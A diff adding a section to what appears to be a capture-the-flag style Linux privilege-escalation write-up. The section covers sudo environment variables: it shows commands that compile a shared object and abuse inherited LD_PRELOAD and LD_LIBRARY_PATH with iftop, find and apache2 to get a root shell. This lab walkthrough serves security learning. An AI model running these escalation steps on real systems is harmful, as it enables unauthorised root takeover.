@@ -542,7 +542,7 @@ Successfully escalated to root!
 
 <br />
 
-
+The answer to this is detailed in the following section.
 
 ```
 No answer needed
@@ -553,7 +553,78 @@ No answer needed
 
 ## 7. Sudo - Environment Variables
 
+<br />
+
+As explained in this task. running the `sudo -l` command will reveal inherited environment variables, which should be listed as `env_keep`.
+
+```
+sudo -l
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172237008-1b10abb9-2e7d-4ea0-8f46-b723ebeb1066.png)
+
+The most important takeaway in this task should be that the `LD_PRELOAD` and `LD_LIBRARY_PATH` are both inherited from the user's environment. `LD_PRELOAD` loads a shared object before any others when a program is run. `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.
+
+Following along with the instructions, we proceed to create a shared object using `gcc` to compile the code in the `/home/user/tools/sudo/preload.c` file.
+
+```
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+```
+
+Running any programs we have permissions to use `sudo` with, setting the `LD_PRELOAD` value to the shared file we just created, will spawn a root shell for us!
+
+```
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+```
+
+As an example, we can use `iftop` to get root:
+
+```
+sudo LD_PRELOAD=/tmp/preload.so iftop
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172238459-7f95fa1f-6fec-432c-b888-1549c43ec4e7.png)
+
+Same thing happens when we run `find` with `sudo` permissions using the aforementioned `LD_PRELOAD` value:
+
+```
+sudo LD_PRELOAD=/tmp/preload.so find
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172238616-da5869a5-f35c-4391-a072-8f18a50408e7.png)
+
+The same applies to `apache2`:
+
+```
+sudo LD_PRELOAD=/tmp/preload.so apache2
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172240755-276f7f6a-7d64-4a77-9ce7-533ebf973b6e.png)
+
+Time to see if we can use `sudo` with `apache2` to get a root shell, utilizing the `LD_LIBRARY_PATH` this time.
+
+Shared object dependencies are displayed using the `ldd` command. Let's get a list for the ones used with `apache2` on the target:
+
+```
+ldd /usr/sbin/apache2
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172240466-64ccb199-388c-4589-a5b8-31a9af6ea522.png)
+
+We can proceed to create a shared object using the same name as one of the libraries that were just listed.
+
+```
+gcc -o /tmp/libexpat.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+Running `apache2` using `sudo` and setting the `LD_LIBRARY_PATH` to the folder location of the shared file we just created will escalate our privileges to root:
+
+![image](https://user-images.githubusercontent.com/14150485/172242116-cb3a0ba4-a3b0-499b-a93f-451a185a3450.png)
+
+<br />
+
 ### 7.1: Read and follow along with the above.
+
 ```
 No answer needed
 ```
